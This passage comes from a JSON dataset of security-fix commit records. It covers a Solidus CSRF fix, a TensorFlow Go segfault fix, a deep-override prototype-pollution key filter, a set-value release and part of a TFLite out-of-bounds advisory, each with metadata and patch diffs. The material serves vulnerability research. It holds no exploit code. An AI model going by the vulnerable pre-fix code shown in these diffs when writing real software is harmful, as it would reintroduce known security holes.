            "patch_content":"From 4d17cacf066d9492fc04eb3a0b16084b47376d81 Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?Marc=20Busqu=C3=A9?= <marc@lamarciana.com>\nDate: Tue, 14 Dec 2021 10:36:44 +0100\nSubject: [PATCH] Protect `Spree::OrdersController#populate` against CSRF\n attacks\n\nSee\nhttps:\/\/github.com\/solidusio\/solidus\/security\/advisories\/GHSA-h3fg-h5v3-vf8m\nfor all the details.\n\nSome time ago, all order actions were left out of CSRF protection (see\n95ea57058ab1c5e722b327b10747cd41e68a4deb). The reason given was that the\nauthentication token got stale after the second rendering because the\nproduct page is cached. That was limited to `#populate` in\ncb797542c6948ef33d2cc9e6076c88f4cc927fb2 (see also\nhttps:\/\/github.com\/spree\/spree\/pull\/5601).\n\nHowever, those assumptions are not correct. Although the authenticity\ntoken changes at every request, that doesn't mean that the old ones are\nno longer valid. The variation comes from a one-time pad added to a\nsession-dependant token (and meant to avoid timing attacks). However,\nbefore validation, that one-time pad is removed. That means the token\nremains valid as long as the session has not been reset. Think about\nsubmitting a form from one browser tab after opening another with the\nsame URL. Even if both tokens differ, the submission from the first tab\nwill still be valid. You can read\nhttps:\/\/medium.com\/rubyinside\/a-deep-dive-into-csrf-protection-in-rails-19fa0a42c0ef\nfor an in-deep understanding.\n\nThe initial confusion could come because of\nhttps:\/\/github.com\/rails\/rails\/issues\/21948. Due to browser-side cache,\na form can be re-rendered and sent without any attached request cookie.\nThat will cause an authentication error, as the sent token won't match\nwith the one in the session (none in this case). There's no perfect\nsolution for that, and all partial fixes should be seen at the\napplication level. From our side, we must provide a safe default. For an\nexcellent survey of all the available options, take a look at\nhttps:\/\/github.com\/betagouv\/demarches-simplifiees.fr\/blob\/5b4f7f9ae9eaf0ac94008b62f7047e4714626cf9\/doc\/adr-csrf-forgery.md.\nThe information given in that link is third-party but it's very\nrelevant here. For that reason we've copied it in the security advisory\n(see link above), but all the credit goes to @kemenaran.\n---\n frontend\/app\/controllers\/spree\/orders_controller.rb | 1 -\n 1 file changed, 1 deletion(-)\n\ndiff --git a\/frontend\/app\/controllers\/spree\/orders_controller.rb b\/frontend\/app\/controllers\/spree\/orders_controller.rb\nindex bc23c3b46a..f21e4db653 100644\n--- a\/frontend\/app\/controllers\/spree\/orders_controller.rb\n+++ b\/frontend\/app\/controllers\/spree\/orders_controller.rb\n@@ -10,7 +10,6 @@ class OrdersController < Spree::StoreController\n     before_action :assign_order, only: :update\n     # note: do not lock the #edit action because that's where we redirect when we fail to acquire a lock\n     around_action :lock_order, only: :update\n-    skip_before_action :verify_authenticity_token, only: [:populate]\n \n     def show\n       @order = Spree::Order.find_by!(number: params[:id])",
            "code_diff":"@@ -10,7 +10,6 @@ class OrdersController < Spree::StoreController\n     before_action :assign_order, only: :update\n     # note: do not lock the #edit action because that's where we redirect when we fail to acquire a lock\n     around_action :lock_order, only: :update\n-    skip_before_action :verify_authenticity_token, only: [:populate]\n \n     def show\n       @order = Spree::Order.find_by!(number: params[:id])"
        },
        {
            "index":573,
            "vuln_id":"GHSA-cmgw-8vpc-rc59",
            "cwe_id":"{'CWE-20'}",
            "score":5.5,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8721ba96e5760c229217b594f6d2ba332beedf22'}",
            "dataset":"osv",
            "summary":"Segfault on strings tensors with mistmatched dimensions, due to Go code ### Impact\nUnder certain conditions, Go code can trigger a segfault in string deallocation.\n\n\nFor string tensors, `C.TF_TString_Dealloc` is called during garbage collection within a finalizer function.  However, tensor structure isn't checked until encoding to avoid a performance penalty.  The current method for dealloc assumes that encoding succeeded, but segfaults when a string tensor is garbage collected whose encoding failed (e.g., due to mismatched dimensions).\n\nTo fix this, the call to set the finalizer function is deferred until `NewTensor` returns and, if encoding failed for a string tensor, deallocs are determined based on bytes written.\n\n### Patches\nWe have patched the issue in GitHub commit [8721ba96e5760c229217b594f6d2ba332beedf22](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8721ba96e5760c229217b594f6d2ba332beedf22) (merging [#50508](https:\/\/github.com\/tensorflow\/tensorflow\/pull\/50508)).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, which is the other affected version.                                                                                                                                               \n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [fixing PR](https:\/\/github.com\/tensorflow\/tensorflow\/pull\/50508).",
            "published_date":"2021-08-25",
            "chain_len":1,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8721ba96e5760c229217b594f6d2ba332beedf22",
            "commit_sha":"8721ba96e5760c229217b594f6d2ba332beedf22",
            "patch":"SINGLE",
            "chain_ord":"['8721ba96e5760c229217b594f6d2ba332beedf22']",
            "before_first_fix_commit":"{'5a14b2e21e2026b0838f892fed43c4c0e4b3c299', '49499c17794b39a2a7d5be2b477ed7d5704d0629'}",
            "last_fix_commit":"8721ba96e5760c229217b594f6d2ba332beedf22",
            "chain_ord_pos":1.0,
            "commit_datetime":"07\/13\/2021, 22:13:47",
            "message":"Merge pull request #50508 from wamuir:fix-tstring-dealloc\n\nPiperOrigin-RevId: 384557722\nChange-Id: I72858edf72952fd4e7e0a1d9776c9408a7081d42",
            "author":"TensorFlower Gardener",
            "comments":null,
            "stats":"{'additions': 17, 'deletions': 13, 'total': 30}",
            "files":"{'tensorflow\/go\/tensor.go': {'additions': 17, 'deletions': 13, 'changes': 30, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/8721ba96e5760c229217b594f6d2ba332beedf22\/tensorflow%2Fgo%2Ftensor.go', 'patch': '@@ -98,9 +98,9 @@ func NewTensor(value interface{}) (*Tensor, error) {\\n \\n \\traw := tensorData(t.c)\\n \\n-\\truntime.SetFinalizer(t, func(t *Tensor) {\\n+\\tdefer runtime.SetFinalizer(t, func(t *Tensor) {\\n \\t\\tif dataType == String {\\n-\\t\\t\\tt.clearTStrings(raw, nflattened)\\n+\\t\\t\\tt.clearTStrings(raw, int64(nbytes\/C.sizeof_TF_TString))\\n \\t\\t}\\n \\n \\t\\tt.finalize()\\n@@ -111,15 +111,18 @@ func NewTensor(value interface{}) (*Tensor, error) {\\n \\tif isAllArray(val.Type()) {\\n \\t\\t\/\/ We have arrays all the way down, or just primitive types. We can\\n \\t\\t\/\/ just copy the memory in as it is all contiguous.\\n-\\t\\tif err := copyPtr(buf, unpackEFace(value).data, int(val.Type().Size())); err != nil {\\n+\\t\\tif _, err := copyPtr(buf, unpackEFace(value).data, int(val.Type().Size())); err != nil {\\n \\t\\t\\treturn nil, err\\n \\t\\t}\\n \\t} else {\\n \\t\\t\/\/ When there are slices involved the memory for each leaf slice may\\n \\t\\t\/\/ not be contiguous with the others or in the order we might\\n \\t\\t\/\/ expect, so we need to work our way down to each slice of\\n \\t\\t\/\/ primitives and copy them individually\\n-\\t\\tif err := encodeTensorWithSlices(buf, val, shape); err != nil {\\n+\\t\\tif n, err := encodeTensorWithSlices(buf, val, shape); err != nil {\\n+\\t\\t\\t\/\/ Set nbytes to count of bytes written for deferred call to\\n+\\t\\t\\t\/\/ runtime.SetFinalizer\\n+\\t\\t\\tnbytes = uintptr(n)\\n \\t\\t\\treturn nil, err\\n \\t\\t}\\n \\t}\\n@@ -486,13 +489,13 @@ func sizeVarUint(v uint64) int {\\n \\n \/\/ encodeTensorWithSlices writes v to the specified buffer using the format specified in\\n \/\/ c_api.h. Use stringEncoder for String tensors.\\n-func encodeTensorWithSlices(w *bytes.Buffer, v reflect.Value, shape []int64) error {\\n+func encodeTensorWithSlices(w *bytes.Buffer, v reflect.Value, shape []int64) (int, error) {\\n \\t\/\/ If current dimension is a slice, verify that it has the expected size\\n \\t\/\/ Go\\'s type system makes that guarantee for arrays.\\n \\tif v.Kind() == reflect.Slice {\\n \\t\\texpected := int(shape[0])\\n \\t\\tif v.Len() != expected {\\n-\\t\\t\\treturn fmt.Errorf(\"mismatched slice lengths: %d and %d\", v.Len(), expected)\\n+\\t\\t\\treturn 0, fmt.Errorf(\"mismatched slice lengths: %d and %d\", v.Len(), expected)\\n \\t\\t}\\n \\t} else if v.Kind() == reflect.String {\\n \\t\\ts := v.Interface().(string)\\n@@ -501,7 +504,7 @@ func encodeTensorWithSlices(w *bytes.Buffer, v reflect.Value, shape []int64) err\\n \\t\\tptr := unsafe.Pointer(&tstr)\\n \\t\\treturn copyPtr(w, ptr, C.sizeof_TF_TString)\\n \\t} else if v.Kind() != reflect.Array {\\n-\\t\\treturn fmt.Errorf(\"unsupported type %v\", v.Type())\\n+\\t\\treturn 0, fmt.Errorf(\"unsupported type %v\", v.Type())\\n \\t}\\n \\n \\t\/\/ Once we have just a single dimension we can just copy the data\\n@@ -514,15 +517,17 @@ func encodeTensorWithSlices(w *bytes.Buffer, v reflect.Value, shape []int64) err\\n \\t\\treturn copyPtr(w, ptr, v.Len()*int(elt.Type().Size()))\\n \\t}\\n \\n+\\tn := 0\\n \\tsubShape := shape[1:]\\n \\tfor i := 0; i < v.Len(); i++ {\\n-\\t\\terr := encodeTensorWithSlices(w, v.Index(i), subShape)\\n+\\t\\tj, err := encodeTensorWithSlices(w, v.Index(i), subShape)\\n \\t\\tif err != nil {\\n-\\t\\t\\treturn err\\n+\\t\\t\\treturn n + j, err\\n \\t\\t}\\n+\\t\\tn += j\\n \\t}\\n \\n-\\treturn nil\\n+\\treturn n, nil\\n }\\n \\n \/\/ It isn\\'t safe to use reflect.SliceHeader as it uses a uintptr for Data and\\n@@ -536,15 +541,14 @@ type sliceHeader struct {\\n \/\/ copyPtr copies the backing data for a slice or array directly into w. Note\\n \/\/ we don\\'t need to worry about byte ordering because we want the natural byte\\n \/\/ order for the machine we\\'re running on.\\n-func copyPtr(w *bytes.Buffer, ptr unsafe.Pointer, l int) error {\\n+func copyPtr(w *bytes.Buffer, ptr unsafe.Pointer, l int) (int, error) {\\n \\t\/\/ Convert our slice header into a []byte so we can call w.Write\\n \\tb := *(*[]byte)(unsafe.Pointer(&sliceHeader{\\n \\t\\tData: ptr,\\n \\t\\tLen:  l,\\n \\t\\tCap:  l,\\n \\t}))\\n-\\t_, err := w.Write(b)\\n-\\treturn err\\n+\\treturn w.Write(b)\\n }\\n \\n func bug(format string, args ...interface{}) error {'}}",
            "message_norm":"merge pull request #50508 from wamuir:fix-tstring-dealloc\n\npiperorigin-revid: 384557722\nchange-id: i72858edf72952fd4e7e0a1d9776c9408a7081d42",
            "language":"en",
            "entities":"[('#50508', 'ISSUE', ''), ('384557722', 'SHA', 'generic_sha')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['tensorflow\/go\/tensor.go'])",
            "num_files":1.0,
            "patch_content":"From 49499c17794b39a2a7d5be2b477ed7d5704d0629 Mon Sep 17 00:00:00 2001\nFrom: wamuir <17497234+wamuir@users.noreply.github.com>\nDate: Tue, 29 Jun 2021 00:01:37 -0500\nSubject: [PATCH] fix segfault on string tensors with mismatched dimensions\n\n---\n tensorflow\/go\/tensor.go | 30 +++++++++++++++++-------------\n 1 file changed, 17 insertions(+), 13 deletions(-)\n\ndiff --git a\/tensorflow\/go\/tensor.go b\/tensorflow\/go\/tensor.go\nindex cfb389d472dfab..6c58aeb81ff484 100644\n--- a\/tensorflow\/go\/tensor.go\n+++ b\/tensorflow\/go\/tensor.go\n@@ -98,9 +98,9 @@ func NewTensor(value interface{}) (*Tensor, error) {\n \n \traw := tensorData(t.c)\n \n-\truntime.SetFinalizer(t, func(t *Tensor) {\n+\tdefer runtime.SetFinalizer(t, func(t *Tensor) {\n \t\tif dataType == String {\n-\t\t\tt.clearTStrings(raw, nflattened)\n+\t\t\tt.clearTStrings(raw, int64(nbytes\/C.sizeof_TF_TString))\n \t\t}\n \n \t\tt.finalize()\n@@ -111,7 +111,7 @@ func NewTensor(value interface{}) (*Tensor, error) {\n \tif isAllArray(val.Type()) {\n \t\t\/\/ We have arrays all the way down, or just primitive types. We can\n \t\t\/\/ just copy the memory in as it is all contiguous.\n-\t\tif err := copyPtr(buf, unpackEFace(value).data, int(val.Type().Size())); err != nil {\n+\t\tif _, err := copyPtr(buf, unpackEFace(value).data, int(val.Type().Size())); err != nil {\n \t\t\treturn nil, err\n \t\t}\n \t} else {\n@@ -119,7 +119,10 @@ func NewTensor(value interface{}) (*Tensor, error) {\n \t\t\/\/ not be contiguous with the others or in the order we might\n \t\t\/\/ expect, so we need to work our way down to each slice of\n \t\t\/\/ primitives and copy them individually\n-\t\tif err := encodeTensorWithSlices(buf, val, shape); err != nil {\n+\t\tif n, err := encodeTensorWithSlices(buf, val, shape); err != nil {\n+\t\t\t\/\/ Set nbytes to count of bytes written for deferred call to\n+\t\t\t\/\/ runtime.SetFinalizer\n+\t\t\tnbytes = uintptr(n)\n \t\t\treturn nil, err\n \t\t}\n \t}\n@@ -486,13 +489,13 @@ func sizeVarUint(v uint64) int {\n \n \/\/ encodeTensorWithSlices writes v to the specified buffer using the format specified in\n \/\/ c_api.h. Use stringEncoder for String tensors.\n-func encodeTensorWithSlices(w *bytes.Buffer, v reflect.Value, shape []int64) error {\n+func encodeTensorWithSlices(w *bytes.Buffer, v reflect.Value, shape []int64) (int, error) {\n \t\/\/ If current dimension is a slice, verify that it has the expected size\n \t\/\/ Go's type system makes that guarantee for arrays.\n \tif v.Kind() == reflect.Slice {\n \t\texpected := int(shape[0])\n \t\tif v.Len() != expected {\n-\t\t\treturn fmt.Errorf(\"mismatched slice lengths: %d and %d\", v.Len(), expected)\n+\t\t\treturn 0, fmt.Errorf(\"mismatched slice lengths: %d and %d\", v.Len(), expected)\n \t\t}\n \t} else if v.Kind() == reflect.String {\n \t\ts := v.Interface().(string)\n@@ -501,7 +504,7 @@ func encodeTensorWithSlices(w *bytes.Buffer, v reflect.Value, shape []int64) err\n \t\tptr := unsafe.Pointer(&tstr)\n \t\treturn copyPtr(w, ptr, C.sizeof_TF_TString)\n \t} else if v.Kind() != reflect.Array {\n-\t\treturn fmt.Errorf(\"unsupported type %v\", v.Type())\n+\t\treturn 0, fmt.Errorf(\"unsupported type %v\", v.Type())\n \t}\n \n \t\/\/ Once we have just a single dimension we can just copy the data\n@@ -514,15 +517,17 @@ func encodeTensorWithSlices(w *bytes.Buffer, v reflect.Value, shape []int64) err\n \t\treturn copyPtr(w, ptr, v.Len()*int(elt.Type().Size()))\n \t}\n \n+\tn := 0\n \tsubShape := shape[1:]\n \tfor i := 0; i < v.Len(); i++ {\n-\t\terr := encodeTensorWithSlices(w, v.Index(i), subShape)\n+\t\tj, err := encodeTensorWithSlices(w, v.Index(i), subShape)\n \t\tif err != nil {\n-\t\t\treturn err\n+\t\t\treturn n+j, err\n \t\t}\n+\t\tn += j\n \t}\n \n-\treturn nil\n+\treturn n, nil\n }\n \n \/\/ It isn't safe to use reflect.SliceHeader as it uses a uintptr for Data and\n@@ -536,15 +541,14 @@ type sliceHeader struct {\n \/\/ copyPtr copies the backing data for a slice or array directly into w. Note\n \/\/ we don't need to worry about byte ordering because we want the natural byte\n \/\/ order for the machine we're running on.\n-func copyPtr(w *bytes.Buffer, ptr unsafe.Pointer, l int) error {\n+func copyPtr(w *bytes.Buffer, ptr unsafe.Pointer, l int) (int, error) {\n \t\/\/ Convert our slice header into a []byte so we can call w.Write\n \tb := *(*[]byte)(unsafe.Pointer(&sliceHeader{\n \t\tData: ptr,\n \t\tLen:  l,\n \t\tCap:  l,\n \t}))\n-\t_, err := w.Write(b)\n-\treturn err\n+\treturn w.Write(b)\n }\n \n func bug(format string, args ...interface{}) error {",
            "code_diff":"@@ -98,9 +98,9 @@ func NewTensor(value interface{}) (*Tensor, error) {\n \n \traw := tensorData(t.c)\n \n-\truntime.SetFinalizer(t, func(t *Tensor) {\n+\tdefer runtime.SetFinalizer(t, func(t *Tensor) {\n \t\tif dataType == String {\n-\t\t\tt.clearTStrings(raw, nflattened)\n+\t\t\tt.clearTStrings(raw, int64(nbytes\/C.sizeof_TF_TString))\n \t\t}\n \n \t\tt.finalize()\n@@ -111,7 +111,7 @@ func NewTensor(value interface{}) (*Tensor, error) {\n \tif isAllArray(val.Type()) {\n \t\t\/\/ We have arrays all the way down, or just primitive types. We can\n \t\t\/\/ just copy the memory in as it is all contiguous.\n-\t\tif err := copyPtr(buf, unpackEFace(value).data, int(val.Type().Size())); err != nil {\n+\t\tif _, err := copyPtr(buf, unpackEFace(value).data, int(val.Type().Size())); err != nil {\n \t\t\treturn nil, err\n \t\t}\n \t} else {\n@@ -119,7 +119,10 @@ func NewTensor(value interface{}) (*Tensor, error) {\n \t\t\/\/ not be contiguous with the others or in the order we might\n \t\t\/\/ expect, so we need to work our way down to each slice of\n \t\t\/\/ primitives and copy them individually\n-\t\tif err := encodeTensorWithSlices(buf, val, shape); err != nil {\n+\t\tif n, err := encodeTensorWithSlices(buf, val, shape); err != nil {\n+\t\t\t\/\/ Set nbytes to count of bytes written for deferred call to\n+\t\t\t\/\/ runtime.SetFinalizer\n+\t\t\tnbytes = uintptr(n)\n \t\t\treturn nil, err\n \t\t}\n \t}\n@@ -486,13 +489,13 @@ func sizeVarUint(v uint64) int {\n \n \/\/ encodeTensorWithSlices writes v to the specified buffer using the format specified in\n \/\/ c_api.h. Use stringEncoder for String tensors.\n-func encodeTensorWithSlices(w *bytes.Buffer, v reflect.Value, shape []int64) error {\n+func encodeTensorWithSlices(w *bytes.Buffer, v reflect.Value, shape []int64) (int, error) {\n \t\/\/ If current dimension is a slice, verify that it has the expected size\n \t\/\/ Go's type system makes that guarantee for arrays.\n \tif v.Kind() == reflect.Slice {\n \t\texpected := int(shape[0])\n \t\tif v.Len() != expected {\n-\t\t\treturn fmt.Errorf(\"mismatched slice lengths: %d and %d\", v.Len(), expected)\n+\t\t\treturn 0, fmt.Errorf(\"mismatched slice lengths: %d and %d\", v.Len(), expected)\n \t\t}\n \t} else if v.Kind() == reflect.String {\n \t\ts := v.Interface().(string)\n@@ -501,7 +504,7 @@ func encodeTensorWithSlices(w *bytes.Buffer, v reflect.Value, shape []int64) err\n \t\tptr := unsafe.Pointer(&tstr)\n \t\treturn copyPtr(w, ptr, C.sizeof_TF_TString)\n \t} else if v.Kind() != reflect.Array {\n-\t\treturn fmt.Errorf(\"unsupported type %v\", v.Type())\n+\t\treturn 0, fmt.Errorf(\"unsupported type %v\", v.Type())\n \t}\n \n \t\/\/ Once we have just a single dimension we can just copy the data\n@@ -514,15 +517,17 @@ func encodeTensorWithSlices(w *bytes.Buffer, v reflect.Value, shape []int64) err\n \t\treturn copyPtr(w, ptr, v.Len()*int(elt.Type().Size()))\n \t}\n \n+\tn := 0\n \tsubShape := shape[1:]\n \tfor i := 0; i < v.Len(); i++ {\n-\t\terr := encodeTensorWithSlices(w, v.Index(i), subShape)\n+\t\tj, err := encodeTensorWithSlices(w, v.Index(i), subShape)\n \t\tif err != nil {\n-\t\t\treturn err\n+\t\t\treturn n+j, err\n \t\t}\n+\t\tn += j\n \t}\n \n-\treturn nil\n+\treturn n, nil\n }\n \n \/\/ It isn't safe to use reflect.SliceHeader as it uses a uintptr for Data and\n@@ -536,15 +541,14 @@ type sliceHeader struct {\n \/\/ copyPtr copies the backing data for a slice or array directly into w. Note\n \/\/ we don't need to worry about byte ordering because we want the natural byte\n \/\/ order for the machine we're running on.\n-func copyPtr(w *bytes.Buffer, ptr unsafe.Pointer, l int) error {\n+func copyPtr(w *bytes.Buffer, ptr unsafe.Pointer, l int) (int, error) {\n \t\/\/ Convert our slice header into a []byte so we can call w.Write\n \tb := *(*[]byte)(unsafe.Pointer(&sliceHeader{\n \t\tData: ptr,\n \t\tLen:  l,\n \t\tCap:  l,\n \t}))\n-\t_, err := w.Write(b)\n-\treturn err\n+\treturn w.Write(b)\n }\n \n func bug(format string, args ...interface{}) error {"
        },
        {
            "index":254,
            "vuln_id":"GHSA-v659-54cx-g4qr",
            "cwe_id":"{'CWE-1321'}",
            "score":9.8,
            "chain":"{'https:\/\/github.com\/ASaiAnudeep\/deep-override\/commit\/2aced17651fb684959a6e04b1465a8329b3d5268'}",
            "dataset":"osv",
            "summary":"Prototype Pollution in deep-override Prototype pollution vulnerability in 'deep-override' versions 1.0.0 through 1.0.1 allows an attacker to cause a denial of service and may lead to remote code execution.",
            "published_date":"2021-05-17",
            "chain_len":1,
            "project":"https:\/\/github.com\/ASaiAnudeep\/deep-override",
            "commit_href":"https:\/\/github.com\/ASaiAnudeep\/deep-override\/commit\/2aced17651fb684959a6e04b1465a8329b3d5268",
            "commit_sha":"2aced17651fb684959a6e04b1465a8329b3d5268",
            "patch":"SINGLE",
            "chain_ord":"['2aced17651fb684959a6e04b1465a8329b3d5268']",
            "before_first_fix_commit":"{'393135641fb0891409ac2a53783c553a7ed749a9'}",
            "last_fix_commit":"2aced17651fb684959a6e04b1465a8329b3d5268",
            "chain_ord_pos":1.0,
            "commit_datetime":"12\/17\/2020, 17:01:18",
            "message":"Security fix for Prototype Pollution",
            "author":"Arjun Shibu",
            "comments":null,
            "stats":"{'additions': 3, 'deletions': 1, 'total': 4}",
            "files":"{'src\/index.js': {'additions': 3, 'deletions': 1, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/ASaiAnudeep\/deep-override\/raw\/2aced17651fb684959a6e04b1465a8329b3d5268\/src%2Findex.js', 'patch': \"@@ -46,6 +46,8 @@ function override(...rawArgs) {\\n       });\\n     } else {\\n       Object.keys(obj).forEach(key => {\\n+        if (key == '__proto__' || key == 'constructor' || key == 'prototype')\\n+          return\\n         src = target[key];\\n         val = obj[key];\\n         if (val === target) {\\n@@ -69,4 +71,4 @@ function override(...rawArgs) {\\n   return target;\\n }\\n \\n-module.exports = override;\\n\\\\ No newline at end of file\\n+module.exports = override;\"}}",
            "message_norm":"security fix for prototype pollution",
            "language":"en",
            "entities":"[('security', 'SECWORD', ''), ('prototype pollution', 'SECWORD', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['src\/index.js'])",
            "num_files":1.0,
            "patch_content":"From 2aced17651fb684959a6e04b1465a8329b3d5268 Mon Sep 17 00:00:00 2001\nFrom: Arjun Shibu <arjunshibu1999@gmail.com>\nDate: Thu, 17 Dec 2020 22:31:18 +0530\nSubject: [PATCH] Security fix for Prototype Pollution\n\n---\n src\/index.js | 4 +++-\n 1 file changed, 3 insertions(+), 1 deletion(-)\n\ndiff --git a\/src\/index.js b\/src\/index.js\nindex c2f04ed..b92a850 100644\n--- a\/src\/index.js\n+++ b\/src\/index.js\n@@ -46,6 +46,8 @@ function override(...rawArgs) {\n       });\n     } else {\n       Object.keys(obj).forEach(key => {\n+        if (key == '__proto__' || key == 'constructor' || key == 'prototype')\n+          return\n         src = target[key];\n         val = obj[key];\n         if (val === target) {\n@@ -69,4 +71,4 @@ function override(...rawArgs) {\n   return target;\n }\n \n-module.exports = override;\n\\ No newline at end of file\n+module.exports = override;",
            "code_diff":"@@ -46,6 +46,8 @@ function override(...rawArgs) {\n       });\n     } else {\n       Object.keys(obj).forEach(key => {\n+        if (key == '__proto__' || key == 'constructor' || key == 'prototype')\n+          return\n         src = target[key];\n         val = obj[key];\n         if (val === target) {\n@@ -69,4 +71,4 @@ function override(...rawArgs) {\n   return target;\n }\n \n-module.exports = override;\n\\ No newline at end of file\n+module.exports = override;"
        },
        {
            "index":857,
            "vuln_id":"GHSA-4jqc-8m5r-9rpr",
            "cwe_id":"{'CWE-1321', 'CWE-843'}",
            "score":7.3,
            "chain":"{'https:\/\/github.com\/jonschlinkert\/set-value\/commit\/7cf8073bb06bf0c15e08475f9f952823b4576452'}",
            "dataset":"osv",
            "summary":"Prototype Pollution in set-value This affects the package `set-value` before 2.0.1, and starting with 3.0.0 but prior to 4.0.1. A type confusion vulnerability can lead to a bypass of CVE-2019-10747 when the user-provided keys used in the path parameter are arrays.",
            "published_date":"2021-09-13",
            "chain_len":1,
            "project":"https:\/\/github.com\/jonschlinkert\/set-value",
            "commit_href":"https:\/\/github.com\/jonschlinkert\/set-value\/commit\/7cf8073bb06bf0c15e08475f9f952823b4576452",
            "commit_sha":"7cf8073bb06bf0c15e08475f9f952823b4576452",
            "patch":"SINGLE",
            "chain_ord":"['7cf8073bb06bf0c15e08475f9f952823b4576452']",
            "before_first_fix_commit":"{'17ac6b7baa01f328a41987e02c73b71b5b82bc3a'}",
            "last_fix_commit":"7cf8073bb06bf0c15e08475f9f952823b4576452",
            "chain_ord_pos":1.0,
            "commit_datetime":"09\/12\/2021, 07:36:46",
            "message":"4.0.1\n\nFixes https:\/\/github.com\/jonschlinkert\/set-value\/pull\/33 thanks to @ready-research.",
            "author":"Jon Schlinkert",
            "comments":null,
            "stats":"{'additions': 2, 'deletions': 2, 'total': 4}",
            "files":"{'package.json': {'additions': 2, 'deletions': 2, 'changes': 4, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jonschlinkert\/set-value\/raw\/7cf8073bb06bf0c15e08475f9f952823b4576452\/package.json', 'patch': '@@ -1,6 +1,6 @@\\n {\\n   \"name\": \"set-value\",\\n-  \"version\": \"4.0.0\",\\n+  \"version\": \"4.0.1\",\\n   \"description\": \"Set nested properties on an object using dot notation.\",\\n   \"license\": \"MIT\",\\n   \"repository\": \"jonschlinkert\/set-value\",\\n@@ -122,4 +122,4 @@\\n       \"update\"\\n     ]\\n   }\\n-}\\n\\\\ No newline at end of file\\n+}'}}",
            "message_norm":"4.0.1\n\nfixes https:\/\/github.com\/jonschlinkert\/set-value\/pull\/33 thanks to @ready-research.",
            "language":"en",
            "entities":"[('4.0.1', 'VERSION', ''), ('https:\/\/github.com\/jonschlinkert\/set-value\/pull\/33', 'URL', '')]",
            "classification_level_1":null,
            "classification_level_2":null,
            "list_files":"dict_keys(['package.json'])",
            "num_files":1.0,
            "patch_content":"From 7cf8073bb06bf0c15e08475f9f952823b4576452 Mon Sep 17 00:00:00 2001\nFrom: Jon Schlinkert <github@sellside.com>\nDate: Sun, 12 Sep 2021 03:36:46 -0400\nSubject: [PATCH] 4.0.1\n\nFixes https:\/\/github.com\/jonschlinkert\/set-value\/pull\/33 thanks to @ready-research.\n---\n package.json | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\ndiff --git a\/package.json b\/package.json\nindex a9b264e..3865c1f 100644\n--- a\/package.json\n+++ b\/package.json\n@@ -1,6 +1,6 @@\n {\n   \"name\": \"set-value\",\n-  \"version\": \"4.0.0\",\n+  \"version\": \"4.0.1\",\n   \"description\": \"Set nested properties on an object using dot notation.\",\n   \"license\": \"MIT\",\n   \"repository\": \"jonschlinkert\/set-value\",\n@@ -122,4 +122,4 @@\n       \"update\"\n     ]\n   }\n-}\n\\ No newline at end of file\n+}",
            "code_diff":"@@ -1,6 +1,6 @@\n {\n   \"name\": \"set-value\",\n-  \"version\": \"4.0.0\",\n+  \"version\": \"4.0.1\",\n   \"description\": \"Set nested properties on an object using dot notation.\",\n   \"license\": \"MIT\",\n   \"repository\": \"jonschlinkert\/set-value\",\n@@ -122,4 +122,4 @@\n       \"update\"\n     ]\n   }\n-}\n\\ No newline at end of file\n+}"
        },
        {
            "index":757,
            "vuln_id":"GHSA-mxjj-953w-2c2v",
            "cwe_id":"{'CWE-787', 'CWE-125'}",
            "score":7.4,
            "chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8ee24e7949a203d234489f9da2c5bf45a7d5157d'}",
            "dataset":"osv",
            "summary":"Data corruption in tensorflow-lite ### Impact\nWhen determining the common dimension size of two tensors, TFLite uses a `DCHECK` which is no-op outside of debug compilation modes:\nhttps:\/\/github.com\/tensorflow\/tensorflow\/blob\/0e68f4d3295eb0281a517c3662f6698992b7b2cf\/tensorflow\/lite\/kernels\/internal\/types.h#L437-L442\n\nSince the function always returns the dimension of the first tensor, malicious attackers can craft cases where this is larger than that of the second tensor. In turn, this would result in reads\/writes outside of bounds since the interpreter will wrongly assume that there is enough data in both tensors.\n\n### Patches\nWe have patched the issue in 8ee24e7949a20 and will release patch releases for all versions between 1.15 and 2.3.\n\nWe recommend users to upgrade to TensorFlow 1.15.4, 2.0.3, 2.1.2, 2.2.1, or 2.3.1.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
            "published_date":"2020-09-25",
            "chain_len":1,
            "project":"https:\/\/github.com\/tensorflow\/tensorflow",
            "commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/8ee24e7949a203d234489f9da2c5bf45a7d5157d",
            "commit_sha":"8ee24e7949a203d234489f9da2c5bf45a7d5157d",
            "patch":"SINGLE",
            "chain_ord":"['8ee24e7949a203d234489f9da2c5bf45a7d5157d']",
            "before_first_fix_commit":"{'0b5662bc2be13a8c8f044d925d87fb6e56247cd8'}",
            "last_fix_commit":"8ee24e7949a203d234489f9da2c5bf45a7d5157d",
            "chain_ord_pos":1.0,
            "commit_datetime":"09\/18\/2020, 21:19:26",
